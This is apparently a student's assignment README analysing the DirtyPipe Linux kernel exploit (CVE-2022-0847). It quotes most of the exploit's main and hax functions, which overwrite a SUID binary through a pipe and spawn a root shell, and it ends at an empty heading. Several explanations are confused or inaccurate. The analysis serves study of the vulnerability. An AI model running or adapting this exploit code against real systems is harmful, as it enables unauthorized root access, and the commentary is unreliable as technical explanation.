# DirtyPipe-CVE-2022-0847
This repository is developed to analysis and understand DirtyPipe exploit CVE-2022-0847 for my 3rd year 1st year secure software system assignment.

## Paper I wrote

## Peek into main function

exploit code is return in c programing lanugage, so, it is more wiser to start from anlysis from main function. When we look into main function

    if (argc != 2){
          fprintf(stderr, "Usage: %s SUID\n", argv[0]);
          return EXIT_FAILURE;
    }.....

to run the exploit we need to run ./exploit SUID in terminal. which require two arguments 1st one is ./exploit and second one is SUID. from 1st statement if those 2 arguments are not mentioned program will display error message and break from the excution. if 2 arguments are passed, then  program will initalized values to the program

    char *path = argv[1];
    uint8_t *data = elfcode;
   
SUID value is saved to path pointer, elfcode saved to data. what is the elfcode?
 
    int fd = open(path, O_RDONLY);
    
open() is called open read/write end of the pipe assuming file permission is allowing it. inhere path refer to the file and O_RDONLY flag refer to read end of the pipe.
    
    uint8_t *orig_bytes = malloc(sizeof(elfcode));
    
orig_bytes varaible save the obect address allocated in heap for elfcode
    
    lseek(fd, 1, SEEK_SET);
    
repositions the file offset of the open file (inhere SUID) associate with fd, set offset 1 and the file offset is set to offset byte bytes by sEEK_SET flag,
    
    read(fd, orig_bytes, sizeof(elfcode));
    close(fd);
    
read() system call will attempts to read from file descriptor fd up to elfcode bytes into buffer starting at orig_byte. then open fd is closed    
    
    if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) 
    {
        printf("[~] failed\n");
        return EXIT_FAILURE;
    }

    if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
        printf("[~] failed\n");
        return EXIT_FAILURE;
    }
    
then output of hax() function s compare whether it is not equal to zero.in frist instance hax() write elfcode into the pipe, next instance orig_bytes write into the pipe.output of hax() function is create a pipe, splice data check whether the process is done perfectly. understnad hax() refer explainantion on those to functions

    system("/tmp/sh");
    return EXIT_SUCCESS;

if there is no failure root shell will be hijaccked

## peek into hax() function define by user

int hax(char *filename, long offset, uint8_t *data, size_t len)

hax function take 4 parameter into the function: filename, offset, data, length

  const int fd = open(filename, O_RDONLY);
  if (fd < 0) {
        perror("open failed");
        return -1;
  }
  struct stat st;
  if (fstat(fd, &st)) {
        perror("stat failed");
        return -1;
  }

then input file is open in read only permissions and validate offset. fd<0 is used to validate whether file discriptor working since value of fd cant be zero no error will return if any error occurs tht will be exit the program. fstat () will get the open file status ?

    int p[2];
    prepare_pipe(p);
    
PIPE_BUF_FLAG_CAN_MERGE then pipe is created by setting all flags set to one 
    
    --offset;
    
decrement one byte from offset
    
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    
set splice() return value to nbytes   
    
    if (nbytes < 0) {
        perror("splice failed");
        return -1;
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        return -1;
    }    
    
Then nbyte value is greater than zero splice execute correctly
    
        nbytes = write(p[1], data, len);
    if (nbytes < 0) {
        perror("write failed");
        return -1;
    }
    if ((size_t)nbytes < len) {
        fprintf(stderr, "short write\n");
        return -1;
    }
    
 then save write return value to nbyte and check whether write call works
    
    close(fd);
    return 0;
    
then close the file.  

## Peek into prepare_pipe() function

  

